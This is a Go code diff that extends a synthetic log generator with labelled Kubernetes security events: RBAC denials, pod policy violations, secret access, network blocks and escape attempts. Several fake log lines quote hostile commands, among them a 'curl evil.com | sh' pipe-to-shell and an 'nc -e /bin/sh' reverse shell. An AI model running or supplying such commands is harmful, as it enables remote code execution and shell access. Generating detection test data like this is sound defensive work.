@@ -322,21 +322,84 @@ func (g *Generator) generateDatabaseLog(r *rand.Rand) string {
 // generateStructuredLog generates a structured key-value log
 func (g *Generator) generateStructuredLog(r *rand.Rand) string {
 	requestID := generateRandomID(r, 16)
-	level := []string{"info", "warn", "error", "debug"}[r.Intn(4)] // #nosec G404
-	messages := []string{
-		"User authentication failed",
-		"Cache miss for key",
-		"Rate limit exceeded",
-		"Database connection established",
-		"Session expired",
-		"File uploaded successfully",
-		"Background job completed",
-		"Health check passed",
+
+	// Messages with appropriate severity levels
+	securityMessages := []struct {
+		level   string
+		message string
+	}{
+		// Normal operations
+		{"info", "User authentication successful"},
+		{"info", "Cache miss for key"},
+		{"info", "Database connection established"},
+		{"info", "Session created"},
+		{"info", "File uploaded successfully"},
+		{"info", "Background job completed"},
+		{"info", "Health check passed"},
+		{"debug", "Request processed successfully"},
+
+		// Security: Authentication and authorization failures
+		{"warn", "User authentication failed - invalid credentials"},
+		{"warn", "User authentication failed - account locked after 5 attempts"},
+		{"error", "RBAC: access denied for user system:anonymous to resource pods"},
+		{"error", "RBAC: user app-service-account cannot create secrets in namespace production"},
+		{"warn", "ServiceAccount token expired, re-authentication required"},
+		{"error", "Invalid bearer token presented for API authentication"},
+		{"warn", "Rate limit exceeded for user admin-user"},
+		{"error", "Forbidden: user cannot impersonate serviceaccount default/admin"},
+
+		// Security: Container and pod security violations
+		{"error", "Pod security policy violation: privileged containers not allowed"},
+		{"error", "Pod security policy violation: hostNetwork is not allowed"},
+		{"error", "Pod security policy violation: hostPID is not allowed"},
+		{"warn", "Container attempting to run as root user, policy violation"},
+		{"error", "SecurityContext: runAsNonRoot specified but image runs as root"},
+		{"error", "Pod rejected: hostPath volume mount to /etc not permitted"},
+		{"error", "Pod rejected: capabilities add SYS_ADMIN not allowed"},
+		{"warn", "Container image pull from untrusted registry blocked: docker.io/malicious/image"},
+
+		// Security: Secrets and sensitive data access
+		{"warn", "Secret access: user dev-user accessed secret db-credentials in namespace production"},
+		{"error", "Unauthorized attempt to read secret kubernetes-admin-token"},
+		{"warn", "ConfigMap modified: aws-credentials in namespace kube-system"},
+		{"error", "Attempt to mount secret as environment variable blocked by policy"},
+		{"warn", "Service account token mounted in pod without explicit request"},
+
+		// Security: Network policy violations
+		{"error", "NetworkPolicy violation: egress to external IP 185.220.101.45 blocked"},
+		{"warn", "Unexpected outbound connection attempt to port 4444 (common reverse shell)"},
+		{"error", "Pod attempted connection to known malicious IP: 45.33.32.156"},
+		{"warn", "DNS query for suspicious domain: crypto-miner-pool.evil.com"},
+		{"error", "Ingress blocked: source IP 10.0.0.50 not in allowed CIDR range"},
+
+		// Security: Resource and privilege escalation
+		{"error", "Container escape attempt detected: /proc/1/root access denied"},
+		{"warn", "Suspicious process execution in container: /bin/bash -c 'curl evil.com | sh'"},
+		{"error", "Kernel module loading attempt blocked in container"},
+		{"warn", "Container attempting to modify /etc/passwd"},
+		{"error", "Privilege escalation attempt: setuid binary execution blocked"},
+		{"warn", "Container process spawned unexpected child: /usr/bin/nc -e /bin/sh"},
+
+		// Security: Audit and compliance
+		{"warn", "Audit: cluster-admin role bound to user external-contractor"},
+		{"error", "Compliance violation: pod running without resource limits"},
+		{"warn", "Audit: secrets list operation by user jenkins-deployer"},
+		{"error", "Admission webhook rejected pod: missing required security labels"},
+		{"warn", "Node shell access detected via kubectl exec"},
+
+		// Security: Anomalies and threats
+		{"error", "CrashLoopBackOff detected for pod crypto-miner-abc123"},
+		{"warn", "Unusual CPU spike in pod: possible cryptomining activity"},
+		{"error", "OOMKilled: container exceeded memory limit, possible memory bomb"},
+		{"warn", "Pod restarted 15 times in last hour: investigating stability"},
+		{"error", "Image vulnerability scan failed: critical CVE-2024-1234 detected"},
+		{"warn", "Container image signature verification failed"},
 	}
-	message := messages[r.Intn(len(messages))] // #nosec G404
+
+	entry := securityMessages[r.Intn(len(securityMessages))] // #nosec G404
 
 	return fmt.Sprintf("%s request_id=%s [%s] %s",
-		time.Now().Format("15:04:05.000"), requestID, level, message)
+		time.Now().Format("15:04:05.000"), requestID, entry.level, entry.message)
 }
 
 // generateRandomID generates a random alphanumeric ID
